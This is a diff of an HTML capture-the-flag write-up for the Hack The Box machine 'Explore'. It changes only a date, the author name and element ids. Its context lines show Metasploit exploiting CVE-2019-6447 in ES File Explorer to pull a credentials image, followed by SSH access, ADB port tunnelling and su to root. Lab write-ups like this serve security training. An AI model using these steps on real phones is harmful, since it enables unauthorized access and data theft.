@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-11-01 Tue 12:42 -->
+<!-- 2022-12-09 Fri 13:37 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>HTB | Explore</title>
-<meta name="author" content="Main user for my machines" />
+<meta name="author" content="C3lphie" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" type="text/css" href="static/style.css" />
 <script>
@@ -82,7 +82,7 @@ And we'll quickly find that this isn't a normal box, this is an android phone!<b
 <p>
 The result from <code>nmap</code> isn't really that useful as it is filled with a lot of noise.<br>
 </p>
-<pre class="example" id="org6e6bff7">
+<pre class="example" id="org64f9f8d">
 # Nmap 7.91 scan initiated Mon Jul 26 23:11:21 2021 as: nmap -sC -sV -p- -oA nmap/all_ports -v 10.129.161.205
 Nmap scan report for 10.129.161.205
 Host is up (0.032s latency).
@@ -281,7 +281,7 @@ We can use the vulnerability to read files on the machine, and hopefully find so
 Metasploit has a handy module for exploiting CVE-2019-6447, that we can use for enumerating all kinds of things on the machine.<br>
 We can start by looking at installed apps:<br>
 </p>
-<pre class="example" id="org9aef00c">
+<pre class="example" id="orgb6a0ee0">
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION LISTAPPS
 ACTION =&gt; LISTAPPS
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; run
@@ -304,7 +304,7 @@ This more or less just confirmed the findings from the <code>nmap</code> scan.<b
 <p>
 We can also look at pictures on the phone:<br>
 </p>
-<pre class="example" id="orgc159540">
+<pre class="example" id="org9676d03">
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION LISTPICS
 ACTION =&gt; LISTPICS
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; run
@@ -326,7 +326,7 @@ Which proved quite promising with the <code>creds.jpg</code> pricture!<br>
 <p>
 So let's download <code>creds.jpg</code> and get those juicy secrets<br>
 </p>
-<pre class="example" id="orgdd04a08">
+<pre class="example" id="orgf26b0ba">
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION GETFILE
 ACTION =&gt; GETFILE
 sf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
@@ -357,7 +357,7 @@ We can now login with using ssh and get a shell!<br>
 <p>
 Now that we have credentials, we can just connect through ssh and get user flag!<br>
 </p>
-<pre class="example" id="org7ebc104">
+<pre class="example" id="orgda039c1">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/explore ]
 └─&gt; $ ssh explore.htb                                               
 Password authentication
@@ -393,7 +393,7 @@ f32017174c7c7e8f50c6da52891ae250
 <p>
 Next thing we can do tunnel the port to get a connection to the <code>freeciv</code> port which is meant for Android Debugging Bridge.<br>
 </p>
-<pre class="example" id="org279af0c">
+<pre class="example" id="orgc71bc0f">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/explore ]
 └─&gt; $ ssh explore.htb -L 5555:127.0.0.1:5555 
 Password authentication
@@ -412,7 +412,7 @@ $ adb connect 127.0.0.1:5555
 <p>
 And the use <code>adb shell</code> to get a basic shell, that we can upgrade to root using <code>su</code><br>
 </p>
-<pre class="example" id="org2c94ae2">
+<pre class="example" id="org9e43898">
 
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/explore ]
 └─&gt; $ adb shell                                                     1:12
@@ -423,7 +423,7 @@ x86_64:/ $ su
 <p>
 And then finally get the root flag<br>
 </p>
-<pre class="example" id="org2f586d1">
+<pre class="example" id="orgfc550b8">
 1|:/ # ls data
 adb           bootchart     media       property       tombstones
 anr           cache         mediadrm    resource-cache user
